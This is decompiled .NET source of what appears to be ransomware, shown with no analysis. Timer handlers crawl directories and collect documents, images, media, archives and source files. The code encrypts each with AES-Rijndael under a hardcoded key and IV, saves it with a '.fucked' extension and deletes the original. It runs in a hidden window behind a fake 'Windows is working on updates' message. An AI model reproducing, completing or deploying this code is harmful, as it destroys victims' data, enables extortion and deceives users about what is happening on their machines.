		ProgressBar5.set_Maximum(ListBox5.get_Items().get_Count());
		if (ProgressBar5.get_Value() == ListBox5.get_Items().get_Count())
		{
			Timer5.Stop();
			Timer6.Start();
			return;
		}
		ListBox5.set_SelectedIndex(ProgressBar5.get_Value());
		ListBox5.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox5.get_SelectedItem());
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(filenamez))
			{
				ListBox6.get_Items().Add((object)directory);
				ListBox9.get_Items().Add((object)directory);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar5.Increment(1);
	}

	private void Timer6_Tick(object sender, EventArgs e)
	{
		ProgressBar6.set_Maximum(ListBox6.get_Items().get_Count());
		if (ProgressBar6.get_Value() == ListBox6.get_Items().get_Count())
		{
			Timer6.Stop();
			Timer7.Start();
			return;
		}
		ListBox6.set_SelectedIndex(ProgressBar6.get_Value());
		ListBox6.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox6.get_SelectedItem());
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(filenamez))
			{
				ListBox7.get_Items().Add((object)directory);
				ListBox9.get_Items().Add((object)directory);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar6.Increment(1);
	}

	private void Timer7_Tick(object sender, EventArgs e)
	{
		ProgressBar7.set_Maximum(ListBox9.get_Items().get_Count());
		if (ProgressBar7.get_Value() == ListBox9.get_Items().get_Count())
		{
			Timer7.Stop();
			Timer8.Start();
			return;
		}
		ListBox9.set_SelectedIndex(ProgressBar7.get_Value());
		ListBox9.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox9.get_SelectedItem());
		try
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(filenamez))
			{
				if (file.EndsWith(".fucked"))
				{
					continue;
				}
				if (file.EndsWith(".doc"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".docx"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".xls"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".xlsx"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".ppt"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".pptx"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".jpg"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".jpeg"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".png"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".psd"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".txt"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".zip"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".rar"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".html"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".php"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".asp"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".aspx"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".mp4"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".avi"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".3gp"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".wmv"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".MOV"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".mp3"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".wav"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".flac"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".wma"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".mov"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".raw"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".doc"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".apk"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".encrypt"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith("crypted"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".ahok"))
				{
					ListBox8.get_Items().Add((object)file);
					continue;
				}
				if (file.EndsWith(".cs"))
				{
					ListBox8.get_Items().Add((object)file);
				}
				if (file.EndsWith(".vb"))
				{
					ListBox8.get_Items().Add((object)file);
				}
				else if (file.EndsWith(".ppt"))
				{
					ListBox8.get_Items().Add((object)file);
				}
				else if (file.EndsWith(".pptx"))
				{
					ListBox8.get_Items().Add((object)file);
				}
				else if (file.EndsWith(".docx"))
				{
					ListBox8.get_Items().Add((object)file);
				}
				else if (file.EndsWith(".xlsx"))
				{
					ListBox8.get_Items().Add((object)file);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar7.Increment(1);
	}

	private void Timer8_Tick(object sender, EventArgs e)
	{
		ProgressBar9.set_Maximum(ListBox8.get_Items().get_Count());
		if (ProgressBar9.get_Value() == ListBox8.get_Items().get_Count())
		{
			Timer1.Stop();
			((Control)MyProject.Forms.Form2).Show();
			((Control)this).Hide();
			return;
		}
		ListBox8.set_SelectedIndex(ProgressBar9.get_Value());
		ListBox8.set_SelectionMode((SelectionMode)1);
		filenamez = Conversions.ToString(ListBox8.get_SelectedItem());
		try
		{
			byte[] bytKey = CreateKey("gXBeIX2RIQNszlxEU8CQ");
			byte[] bytIV = CreateIV("V1AVzVQIzeWRi2OW9yrn");
			EncryptOrDecryptFile(filenamez, filenamez + ".fucked", bytKey, bytIV, CryptoAction.ActionEncrypt);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar9.Increment(1);
	}

	public byte[] CreateKey(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		checked
		{
			byte[] array2 = new byte[array.GetUpperBound(0) + 1];
			int upperBound = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			byte[] array3 = new SHA512Managed().ComputeHash(array2);
			byte[] array4 = new byte[32];
			int num = 0;
			do
			{
				array4[num] = array3[num];
				num++;
			}
			while (num <= 31);
			return array4;
		}
	}

	public byte[] CreateIV(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		checked
		{
			byte[] array2 = new byte[array.GetUpperBound(0) + 1];
			int upperBound = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			byte[] array3 = new SHA512Managed().ComputeHash(array2);
			byte[] array4 = new byte[16];
			int num = 32;
			do
			{
				array4[num - 32] = array3[num];
				num++;
			}
			while (num <= 47);
			return array4;
		}
	}

	public void EncryptOrDecryptFile(string strInputFile, string strOutputFile, byte[] bytKey, byte[] bytIV, CryptoAction Direction)
	{
		//IL_0184: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fe: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			try
			{
				fsInput = new FileStream(strInputFile, FileMode.Open, FileAccess.Read);
				fsOutput = new FileStream(strOutputFile, FileMode.OpenOrCreate, FileAccess.Write);
				fsOutput.SetLength(0L);
				byte[] buffer = new byte[4097];
				long num = 0L;
				long length = fsInput.Length;
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				ProgressBar10.set_Value(0);
				ProgressBar10.set_Maximum(100);
				CryptoStream cryptoStream = default(CryptoStream);
				switch (Direction)
				{
				case CryptoAction.ActionDecrypt:
					cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateDecryptor(bytKey, bytIV), CryptoStreamMode.Write);
					break;
				case CryptoAction.ActionEncrypt:
					cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateEncryptor(bytKey, bytIV), CryptoStreamMode.Write);
					break;
				}
				while (num < length)
				{
					int num2 = fsInput.Read(buffer, 0, 4096);
					cryptoStream.Write(buffer, 0, num2);
					num += num2;
					ProgressBar10.set_Value((int)Math.Round((double)num / (double)length * 100.0));
				}
				cryptoStream.Close();
				fsInput.Close();
				fsOutput.Close();
				if (Direction == CryptoAction.ActionEncrypt)
				{
					new FileInfo(strFileToEncrypt).Delete();
				}
				if (Direction == CryptoAction.ActionDecrypt)
				{
					new FileInfo(strFileToDecrypt).Delete();
				}
				string text = "\r\n";
				if (Direction == CryptoAction.ActionEncrypt)
				{
					Interaction.MsgBox((object)("Encryption Complete" + text + text + "Total bytes processed = " + num), (MsgBoxStyle)64, (object)"Done");
				}
				else
				{
					Interaction.MsgBox((object)("Decryption Complete" + text + text + "Total bytes processed = " + num), (MsgBoxStyle)64, (object)"Done");
				}
			}
			catch (Exception projectError) when (((Func<bool>)delegate
			{
				// Could not convert BlockContainer to single expression
				ProjectData.SetProjectError(projectError);
				return Information.Err().get_Number() == 53;
			}).Invoke())
			{
				Interaction.MsgBox((object)"Please check to make sure the path and filenameare correct and if the file exists.", (MsgBoxStyle)48, (object)"Invalid Path or Filename");
				ProjectData.ClearProjectError();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				fsInput.Close();
				fsOutput.Close();
				if (Direction == CryptoAction.ActionDecrypt)
				{
					new FileInfo(filenamez).Delete();
				}
				else
				{
					new FileInfo(filenamez).Delete();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_006a: Expected O, but got Unknown
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_008c: Expected O, but got Unknown
		//IL_0093: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Expected O, but got Unknown
		//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ae: Expected O, but got Unknown
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b9: Expected O, but got Unknown
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c4: Expected O, but got Unknown
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cf: Expected O, but got Unknown
		//IL_00d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00da: Expected O, but got Unknown
		//IL_00db: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e5: Expected O, but got Unknown
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f0: Expected O, but got Unknown
		//IL_00f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fb: Expected O, but got Unknown
		//IL_00fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0106: Expected O, but got Unknown
		//IL_0107: Unknown result type (might be due to invalid IL or missing references)
		//IL_0111: Expected O, but got Unknown
		//IL_0112: Unknown result type (might be due to invalid IL or missing references)
		//IL_011c: Expected O, but got Unknown
		//IL_011d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0127: Expected O, but got Unknown
		//IL_0128: Unknown result type (might be due to invalid IL or missing references)
		//IL_0132: Expected O, but got Unknown
		//IL_0133: Unknown result type (might be due to invalid IL or missing references)
		//IL_013d: Expected O, but got Unknown
		//IL_013e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0148: Expected O, but got Unknown
		//IL_0149: Unknown result type (might be due to invalid IL or missing references)
		//IL_0153: Expected O, but got Unknown
		//IL_0154: Unknown result type (might be due to invalid IL or missing references)
		//IL_015e: Expected O, but got Unknown
		//IL_015f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0169: Expected O, but got Unknown
		//IL_016a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0174: Expected O, but got Unknown
		//IL_0175: Unknown result type (might be due to invalid IL or missing references)
		//IL_017f: Expected O, but got Unknown
		//IL_0180: Unknown result type (might be due to invalid IL or missing references)
		//IL_018a: Expected O, but got Unknown
		//IL_018b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0195: Expected O, but got Unknown
		//IL_01c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cf: Expected O, but got Unknown
		//IL_0275: Unknown result type (might be due to invalid IL or missing references)
		//IL_027f: Expected O, but got Unknown
		//IL_0af7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b01: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Label1 = new Label();
		Timer8 = new Timer(components);
		Timer7 = new Timer(components);
		Timer6 = new Timer(components);
		Timer5 = new Timer(components);
		Timer4 = new Timer(components);
		Timer3 = new Timer(components);
		Timer2 = new Timer(components);
		Timer1 = new Timer(components);
		Label2 = new Label();
		ProgressBar10 = new ProgressBar();
		ProgressBar9 = new ProgressBar();
		ProgressBar8 = new ProgressBar();
		ProgressBar7 = new ProgressBar();
		ProgressBar6 = new ProgressBar();
		ProgressBar5 = new ProgressBar();
		ProgressBar4 = new ProgressBar();
		ProgressBar3 = new ProgressBar();
		ProgressBar2 = new ProgressBar();
		ProgressBar1 = new ProgressBar();
		ListBox9 = new ListBox();
		ListBox8 = new ListBox();
		ListBox7 = new ListBox();
		ListBox6 = new ListBox();
		ListBox5 = new ListBox();
		ListBox4 = new ListBox();
		ListBox3 = new ListBox();
		ListBox2 = new ListBox();
		ListBox1 = new ListBox();
		PictureBox1 = new PictureBox();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Arial", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.White);
		((Control)Label1).set_Location(new Point(166, 365));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(304, 48));
		((Control)Label1).set_TabIndex(45);
		Label1.set_Text("Windows is working on updates\r\nwait till complete");
		Label1.set_TextAlign((ContentAlignment)32);
		((Control)Label2).set_Anchor((AnchorStyles)2);
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.White);
		((Control)Label2).set_Location(new Point(449, 605));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(342, 18));
		((Control)Label2).set_TabIndex(44);
		Label2.set_Text("Don't turn off your computer, this will take a while.");
		Label2.set_TextAlign((ContentAlignment)512);
		((Control)ProgressBar10).set_Location(new Point(582, 334));
		((Control)ProgressBar10).set_Name("ProgressBar10");
		((Control)ProgressBar10).set_Size(new Size(100, 23));
		((Control)ProgressBar10).set_TabIndex(42);
		((Control)ProgressBar9).set_Location(new Point(582, 294));
		((Control)ProgressBar9).set_Name("ProgressBar9");
		((Control)ProgressBar9).set_Size(new Size(100, 23));
		((Control)ProgressBar9).set_TabIndex(41);
		((Control)ProgressBar8).set_Location(new Point(409, 294));
		((Control)ProgressBar8).set_Name("ProgressBar8");
		((Control)ProgressBar8).set_Size(new Size(100, 23));
		((Control)ProgressBar8).set_TabIndex(40);
		((Control)ProgressBar7).set_Location(new Point(272, 294));
		((Control)ProgressBar7).set_Name("ProgressBar7");
		((Control)ProgressBar7).set_Size(new Size(100, 23));
		((Control)ProgressBar7).set_TabIndex(39);
		((Control)ProgressBar6).set_Location(new Point(145, 294));
		((Control)ProgressBar6).set_Name("ProgressBar6");
		((Control)ProgressBar6).set_Size(new Size(100, 23));
		((Control)ProgressBar6).set_TabIndex(38);
		((Control)ProgressBar5).set_Location(new Point(19, 294));
		((Control)ProgressBar5).set_Name("ProgressBar5");
		((Control)ProgressBar5).set_Size(new Size(100, 23));
		((Control)ProgressBar5).set_TabIndex(37);
		((Control)ProgressBar4).set_Location(new Point(572, 117));
		((Control)ProgressBar4).set_Name("ProgressBar4");
		((Control)ProgressBar4).set_Size(new Size(100, 23));
		((Control)ProgressBar4).set_TabIndex(36);
		((Control)ProgressBar3).set_Location(new Point(409, 117));
		((Control)ProgressBar3).set_Name("ProgressBar3");
		((Control)ProgressBar3).set_Size(new Size(100, 23));
		((Control)ProgressBar3).set_TabIndex(35);
		((Control)ProgressBar2).set_Location(new Point(252, 117));
		((Control)ProgressBar2).set_Name("ProgressBar2");
		((Control)ProgressBar2).set_Size(new Size(100, 23));
		((Control)ProgressBar2).set_TabIndex(34);
		((Control)ProgressBar1).set_Location(new Point(50, 117));
		((Control)ProgressBar1).set_Name("ProgressBar1");
		((Control)ProgressBar1).set_Size(new Size(100, 23));
		((Control)ProgressBar1).set_TabIndex(33);
		((ListControl)ListBox9).set_FormattingEnabled(true);
		((Control)ListBox9).set_Location(new Point(582, 193));
		((Control)ListBox9).set_Name("ListBox9");
		((Control)ListBox9).set_Size(new Size(120, 95));
		((Control)ListBox9).set_TabIndex(32);
		((ListControl)ListBox8).set_FormattingEnabled(true);
		((Control)ListBox8).set_Location(new Point(409, 193));
		((Control)ListBox8).set_Name("ListBox8");
		((Control)ListBox8).set_Size(new Size(120, 95));
		((Control)ListBox8).set_TabIndex(31);
		((ListControl)ListBox7).set_FormattingEnabled(true);
		((Control)ListBox7).set_Location(new Point(271, 193));
		((Control)ListBox7).set_Name("ListBox7");
		((Control)ListBox7).set_Size(new Size(120, 95));
		((Control)ListBox7).set_TabIndex(30);
		((ListControl)ListBox6).set_FormattingEnabled(true);
		((Control)ListBox6).set_Location(new Point(145, 193));
		((Control)ListBox6).set_Name("ListBox6");
		((Control)ListBox6).set_Size(new Size(120, 95));
		((Control)ListBox6).set_TabIndex(29);
		((ListControl)ListBox5).set_FormattingEnabled(true);
		((Control)ListBox5).set_Location(new Point(19, 193));
		((Control)ListBox5).set_Name("ListBox5");
		((Control)ListBox5).set_Size(new Size(120, 95));
		((Control)ListBox5).set_TabIndex(28);
		((ListControl)ListBox4).set_FormattingEnabled(true);
		((Control)ListBox4).set_Location(new Point(572, 16));
		((Control)ListBox4).set_Name("ListBox4");
		((Control)ListBox4).set_Size(new Size(120, 95));
		((Control)ListBox4).set_TabIndex(27);
		((ListControl)ListBox3).set_FormattingEnabled(true);
		((Control)ListBox3).set_Location(new Point(409, 16));
		((Control)ListBox3).set_Name("ListBox3");
		((Control)ListBox3).set_Size(new Size(120, 95));
		((Control)ListBox3).set_TabIndex(26);
		((ListControl)ListBox2).set_FormattingEnabled(true);
		((Control)ListBox2).set_Location(new Point(252, 16));
		((Control)ListBox2).set_Name("ListBox2");
		((Control)ListBox2).set_Size(new Size(120, 95));
		((Control)ListBox2).set_TabIndex(25);
		((ListControl)ListBox1).set_FormattingEnabled(true);
		((Control)ListBox1).set_Location(new Point(50, 16));
		((Control)ListBox1).set_Name("ListBox1");
		((Control)ListBox1).set_Size(new Size(120, 95));
		((Control)ListBox1).set_TabIndex(24);
		((Control)PictureBox1).set_Location(new Point(29, 365));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(100, 50));
		PictureBox1.set_SizeMode((PictureBoxSizeMode)4);
		PictureBox1.set_TabIndex(43);
		PictureBox1.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(848, 439));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar10);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar9);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar8);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar7);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar6);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar5);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar4);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar3);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar2);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)ListBox9);
		((Control)this).get_Controls().Add((Control)(object)ListBox8);
		((Control)this).get_Controls().Add((Control)(object)ListBox7);
		((Control)this).get_Controls().Add((Control)(object)ListBox6);
		((Control)this).get_Controls().Add((Control)(object)ListBox5);
		((Control)this).get_Controls().Add((Control)(object)ListBox4);
		((Control)this).get_Controls().Add((Control)(object)ListBox3);
		((Control)this).get_Controls().Add((Control)(object)ListBox2);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
